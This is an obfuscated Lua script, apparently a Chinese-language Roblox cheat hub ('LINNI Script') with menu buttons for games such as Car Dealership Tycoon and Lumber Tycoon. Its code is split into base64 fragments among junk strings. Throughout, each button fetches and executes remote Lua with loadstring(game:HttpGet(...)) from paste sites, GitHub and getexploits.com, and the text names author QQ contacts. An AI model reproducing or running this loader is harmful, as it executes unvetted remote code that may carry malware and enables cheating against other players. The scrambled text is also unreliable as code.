W5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')铲雪模拟器脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nZwimAhcswdJDUpLQhilsTgIIwcEbjoeioAjVDRTgvSBNLrVtHcPZhitLmJcVpElYIJAmrLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GbmGkklfvhbBczNCWTicbgEytvUTbzKzCFPfAKBqwUVyfrSZJeJVaGrhrQbwCBlKdFrDFIKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('cnoKcsySPpGDoSiFFXXTExCWcItCLczOIsKfMriJjLJIzqVyxrHAQncShkNkIeVtOBenjhLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')铲雪模拟器tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('tBwViyUlHGiDXkLdBKZeOUbPGfEMhvwtFPkKsNdHcQukZlklIjSdGMDYEsdrGMtNGWnEjqLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~KJAKAKSKKStZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QrKURpofvzbuXpcSCLAIhZrMxEcHZSOejLMeMCnMSOCBkGcSIWkIUqnaVNtDTdxplMNXrIKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')幸运方块tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('iRADawqCZXFEdMEXGIPvPPUPiMdaXsttoOsMjrTswJhHAIMmsrXkwVZlgrOTSWTQkslBypLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZnoBtENPvwHRHJhCHrDuJrUrRipgseMMhOrciOTHpAQvDiWTCJzPIDZOkaLNpjEpfeDuRuKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VtrOvQSUiuxZMxGRdXmRTYerwcXPauzOMaJlNIHGoKYdxXYJVrPhZsOlDkBFfSUcWCuWDMLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rVNfQPDGrYkGxLqGsUFEoMIBWITAhpzJQqinzDJBTsIBnuHIulcQTnluLNKzxGSqYqsngvLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('kPhbCmjkKjbwqaCLhLYRufEdvTyNmSEuVCFnYzNMrURKSYcyCNaTjJuppfVJBCnbAYLsZvamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ALGPiQxSjHADvuSDDLKNbzyyyWpzdlOnljFbspzGlcXCmNzhuPCplpSadkwUrDDubriYOJamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('EEyGIdmnzZnDuCtiiOcSwXdPksBlezpyRszkZlUZNIkGxCKEnsmiOSoskkEYbfwdZJmgcsbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SXwNGSuTHdIgvElbBjRGRmUTltzCLaNeyuRzaIHDQHkDbieMyaYDGFNBYEYmjQpwFkmossKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')汽车经销大亨tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UGQDRbNsPThEYHuGIoIVOSomnzTXHrmvqmeFuFRruvKwKCneijqoTEeLqSsbgsCPgrsRLnLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZFYQpRVWJKuiuKmimHocnUTgpXvLACkkXOnpPuSHQDBoWedBvOyHjqoUEHBrUUeGsrzCRoKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QydLCdExcpUgoVnqZBDLcMElPZWQmzinECJClMruwKVgcgUnMfKraCiJIUdlsLUHbAxnYdLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')汽车经销大亨（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KOKXDDuFEhOTtMqTIHdnftistUfLzUTprFTQhFniIWhSacTcIkFNgKLETFhcBpYJcpxiRrLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/5o594Q0i/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AucTPfDBqRvAHlIauGLjnAWFoqQsuJSindCpvvHcNhCHwzeIqwVwTeGQhkMzUkjXPbMGaSKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')汽车经销大亨（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AXoqyFotAeJtJnjfVGVjtVdTLNnbxerqONJpJmAsmsnLMIkLyjAncttRzhhEiHgxkVgfimLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/03sAlt/BlueLockSeason2/main/README.mdtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('COiOQrVYfmJDVkiCuVpGjQiEmyeEXMkNzvjvoIfIAkpczdhKQZDXFxKJVxvaSiPlWGEJHCKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')汽车经销大亨（收集所有砖头）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('shYhryTMBrnBAGfdObwaKntYVtDoZFIXMeJWbMCMwJGQJQQmTCrPhPNcPYXrsglqZTxIqWLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/IExpIoit/Script/main/Car%20Dealership%20Tycoon.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('EFYSUztDWUSocVQcdprUTJfmFAKWzXzoLSpquUrtVHXmUBuDIjCouUoODHCqrbzggOOXeHKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('IrpIYCBsjkTVPBpWNFMOhwHUOLZGMtHFMeJOuxJIwUZirPcySmgmAxARHpLHkMahlmczRaLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('quiJclmeaCfXhaxWTWVjjAXxSfBMAnpuFuqyqAdzzZKXvKNEDDKlyVCbzCDttDnagxrkPHamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('sSonzyfSQjGFafqtYIgREhaMdHLEuzkCswtfJRAOJkbrHPfZGGqCIcummcVZOvjiVdZZbyamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('unuBWgrhXyKRwtNPwjwvHRCiftzQYqmwRJoKkJUVspDXYNcdkcAONokYLZCxCIDkKWeVDIbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ftauuojDJwgvmGjDuAvLJJlmsPlKYWgzrCKHsZerRwzCXvJIGBBzsfgIGLxDxRqRzcZHQzKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')寻宝模拟器tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XTNNrbtdDvthQEklcHOoNxLeHSUdqLYRQwDNfoEIjkYQAzsYMDZXKZYyrzIFkNwkQBHnWcLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('MkyjDKIWwSZRkfDvIjESRQOkayUCpqIHEHnPSmxbMlRJXkoreLiSzGJtOJGzDMxmWFKKXtKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('OeGycoOpgwsiFCJklGrvxDtuEMpKftbdegqLfWCGEhqJHMSStViKmnlEqezrFhKYrQVNirLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')寻宝模拟器『霖溺汉化』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hNwJAoZfiobSFoUAtfrmKjBGybPdzgzDnAkHBSQwCnJATjEmbntWGpaDpsESsmcGCditAALGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~MKStZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rhvjQcRyzXEFYkUcsifgHnixOPQPpbDakxnPDixPRufzPBrkxyNeqydJCoRNDfYdEtqWqNKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('sVWWXyryBsAyzNhfeFikSETRowSaisyDdZpYzwamEUtDxdNspPkzLLeiKoyWEbrEPbzLzFLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('varwtIutEQdvOKJhPTYymZtkkWnoExyrPrJIYgDWcbKUCTSZJnyimVtJOloUyBTgYHaIBwamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HeoyndmYxxxlugxxdHKcocdlwHVVIxtNGxnHbdzhMGtIZiqGvugsoLPYVtRbERLEVPPVotamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GOzMaFtsCXuuNKPcoesljPEZHRHVFlOLBLIoKYeZVqCEHKdYPtUVjVnoAImDsxcJQnEcVMbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('dNYFHmvJnDzmkOqQaUVlxZzkaeWtUArmQUvpkRktwEdKjbkuMKWwTpPggoXOPTJpCpRqfdKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')拳击模拟器tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('uxiEkTNLOzPsyBPsyywRvPxoOrFHhywNldlqKEdSyngzlHDZCdpWvkJsUinbsWGRFQnGWNLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nNMUIUoaptyFIajcvuhYgjeQiEKDzZExVndUolKQbeQNqSNAibgGysNSUvfVUnHlevflTjKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xzTmYDtQLIVfxelFrvvaDZMqXtQflhHswlhteETzCTQXxCZYmQXUhPtBfnTFSQJWbuUzicLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')拳击模拟器（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mWSaFCfkORriABjfdgjaASECdXyXcccdNlGcqrUpGQEAVJPPVdTfBAyYTRQuIawFALCLjVLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/T4O1SA3q/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('aFfaDxWMyttdAszmhsdWCLupzjXCeEFbTDMFvGBiqWpKvDLuZcFmdFdONkUQbbubCItJKPKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')拳击模拟器（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lUeyxtmNcJNZoyxukpMFhOmULXlawGbWQtifmgiooNYQVKayQYNnIRwdUtNxBffcEdyakaLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/Solx69/Shit-Boy-Hub-Main/main/Master.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hCRLYqYYKjJlbwHacYAVItrnMUxBpADBmBbaTBkRILjvVkDIiVDUrzovDRzABhqDwAFQjcKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HVzbpqZwVhqdwWAIFCKlWTGjbquEAXXIXtfHsdgYhHANPvjSOmKIBPqNlCqnJUuMhKHlzwLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rxVaQHBbmXilotNcqMPvjXwvOxfLtRNFLdBkgDalEQDkvfiXEYMJdEDtVJgyExvjQevvOqamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LQsgNqmxRmDXzGOsnitrDHIpwiVdaTEHqrokLqBcoTkbokzBeoaxyLsVNTAHNwENTbZigxamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CYSMsGGbrlIdzYKWaqxsRlrDpBvShxOjOZayycBhqheahArJevjMMEVXCpEOyTHJzNRAEqbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rDHMSwECCNfwCHRBtByTmrUPsdHYjNeLaAMrwWJfKzQPeJdLfSfvFqHEtNbyoiKLaiwdasKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')伐木大亨tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('MeaDhdTmlIqhEBiQZBuZWkmOCxgZkqlimLsYZfGRJbfMuMSwBAAmGxqXDyUogSqqmFjfPULA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UNMLOJuzFihGufXnwjBPqvZZUqukhbJASUfiuSXIWkWEJDnqzeGCeoQBVmCrwgCEwGLOseKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('YbzzFAREZlXBnWrRKSpnKaytyePsnVlAoOjUcycRUQYfLClPPLhtCHmiKQnurjitLGTtHtLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')伐木大亨（听说最强）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('uxYAglQfomSVEjlksGsbkQoTdEtjNOcTdxJzuSlvWnlcaMZROUTqMFGhpbZlqLAozkINozLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/frencaliber/LuaWareLoader.lw/main/luawareloader.wtftZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('BnkLfJjYQDXDOSUCTqqAmRrllwvYDTSrCBXmvLLswHrIiJBKcyLnaOfUTMXqWqDcLXPmYsLHRydWUpKSgpDQplbmQpDQogICAgY3JlZGl0czpCdXR0b24o')想白的老外脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('dXRiomcfTjkrlZrwUjBwokszMtWmmnIZumrZGvKCvJXiUVrHJKjKuUrkpXjayNljLWgfVnLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://getexploits.com/key-system/tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('gsNeYpCPgRUJyVfnKgozITCuHTaeGoAcOMRXJSCNpabvusGwUdWBcdDrEmNEvuFtwGDBKALHRydWUpKSg=')https://da.com/936657404291084298/1006220505583460352/Script.txttZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xhAKeVWHjivBLRHoyfMTZmWoxrXpKfAQoyBQZnHwRnGnwHIbVdkrGiKonaZJjCEgaxsRwcKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')白脚本（不知道能不能用）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZOjqVbYLvYtSWPbSOjHmgJyzyVmdUjvDFGCNySyoCzTKSokIEGohIQVAcbuXZCdIiHsNoTLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/CloudX-ScriptsWane/ScriptsDache/main/%E4%BC%90%E6%9C%A8%E5%A4%A7%E4%BA%A822.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('iDPchRoFXbPhMITmWleUTnKqZgqBFpcYJWCunRQEBAnfQwevFfPWjHrJdXWAuwiWZoHYBgLCB0cnVlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')伐木大亨tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qFnHYnfeyQyCjzcVSgwlyCqvclOKcJkvfaBOaIlNvOYePukVztCNjoTHlzPteDMYtAgFzILGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~/dkfkfkfjfkfjdj/longshu/main/lllllklllllllltZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ElYMFomqFcdnhCujSlWZHYiAjDFYwWtjIkrFJaxesdkGBMZVGXPHmphjeRAzhRCaFrmAlxKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LkYfAUgHxbmQPVneaTDROMxznjKmLGLycrIrnpbBuYlYAJyyqLFOiRwdoyRxdKsgOYOmiJLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VciNbpkIGMtySRBGYVfRKZexjfWsJXBhQYYDCzXwidKOrcdcowMdEVidxfXWroHeBerOTGamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PkHBcmqCDzAhSBUiivpPlkxrgpriozBqKandeCEQFbUhiRWiGKosuLfARIbzLeEjssaLuuamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('YSrYRuGsnOlhqmqFntJXhTuRTTpxrTRFbHrfikEPPjfEutnCwLyLxpbriJiPLTZGkIaiwQbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('aoEldsIEOmtyOfkpTtnRgfxKIIWUmBZNiIVyjLMgzxCoCUHtOKAEtDYNecGpjsMTvkaquSKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')绵羊大亨脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xbMIbdYQAwJEExEnIwXLwiyOdaQYJNpxRJyTHUMghbOfphfPxTBEsdNWNrnbWWUmqGIlwiLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xDYQOjZYHTEcfEksNkEBIfmCljymGyMBDkKDnVFEZJSKhbsRjPfvubbTZfGlxniHqsEdsvKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CmLycFttVgAuzFSmDLcpmusFyrrJBUTCMvJZgNJsjdTKMswcOPasftoDtgXseVDSugOwlPLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')绵羊大亨『小天』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nduYdltmETIkvhNlztFCMawLYtnazaQJppWxyvvrVqhocYsvffpyKrSLVrckpAjZdCOwHELGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgo')https://shz.al/PHeptZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GmDrsMuJlZwNJTsgpojIXgPTMhlZRDsMgSxRRekmDmEKqmfXDDzRVtIIsiOSbidneNHWEpKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')最强战场tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KxtNlOTCrHhsPSmijHGsiyPvTbXCsjRUHpxLkXHrdnkNVqppQXhZSipYCwiapTkdlPHIHDLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HQwdiKeAFGCakaanjJIYfePldBvLQmiTphInapmtyXofPNcuQwzXlFCIyDJlOblbZuvwMdKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rsmkOPiAtgdbZPRObjMFVwWpwgtubsbNNVQDuEkaLWmdgQHCGGGPRDcfCuIVUUZNSSDlDZLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')最强战场能用tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('OCkNPrxlogstRHBGDackFxhsyUKXxsJAQoVpaOGqpoWzOkHmATDMylYRUPiZjRLVjBeAFDLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/Scripterbacon/TSBobfuscator/main/Main.LuatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KcldQwTeKLNlnEJylWAKDpKKwnbionUuflIRymDtEHgVHxiboeUymJeUsSxpKQylanerNRKSkoKQ0KZW5kKQ0KbG9jYWwgY3JlZGl0cyA9IGNyZWRzOnNlY3Rpb24o')『需要密钥脚本』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ